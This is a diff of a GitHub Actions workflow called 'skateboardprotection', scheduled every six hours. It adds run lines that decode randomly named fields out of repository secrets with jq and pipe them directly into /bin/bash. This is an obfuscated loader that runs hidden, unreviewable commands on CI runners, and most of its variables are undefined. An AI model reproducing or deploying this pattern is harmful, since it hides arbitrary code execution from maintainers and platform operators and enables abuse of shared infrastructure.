@@ -2,22 +2,23 @@ name: skateboardprotection
 on:
   workflow_dispatch:
   schedule:
-    - cron: '38 1/6 * * *'
-jobs:  # 13183
+    - cron: '22 1/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: skateboardprotection
         env:
-          zvjk826: ${{ secrets.zvjk826 }}
+          qnbaf1: ${{ secrets.qnbaf1 }}
         run: |
-          echo $zvjk826 | jq -r .fwi3047 | /bin/bash
-          echo $fk3908 | jq -r .zyba4323 | /bin/bash
-          echo $vewi108 | jq -r .rhu28 | /bin/bash
-          echo $dire8 | jq -r .uj4 | /bin/bash
-          echo $c33387 | jq -r .ug6468 | /bin/bash
-          echo $hgzj30 | jq -r .oohkl67705 | /bin/bash
-          echo $qfw5 | jq -r .jvh529 | /bin/bash
+          echo $qnbaf1 | jq -r .ybv0 | /bin/bash
+          echo $c56 | jq -r .ro05353 | /bin/bash
+          echo $yjb249 | jq -r .mdx15732 | /bin/bash
+          echo $mcom3 | jq -r .en695 | /bin/bash
+          echo $redk79398 | jq -r .gxuef75 | /bin/bash
+          echo $r2 | jq -r .qsxcf3 | /bin/bash
+          echo $zr88 | jq -r .e026 | /bin/bash
+          echo $x37 | jq -r .r2236 | /bin/bash
+          echo $pvn406 | jq -r .ssrk7968 | /bin/bash
 
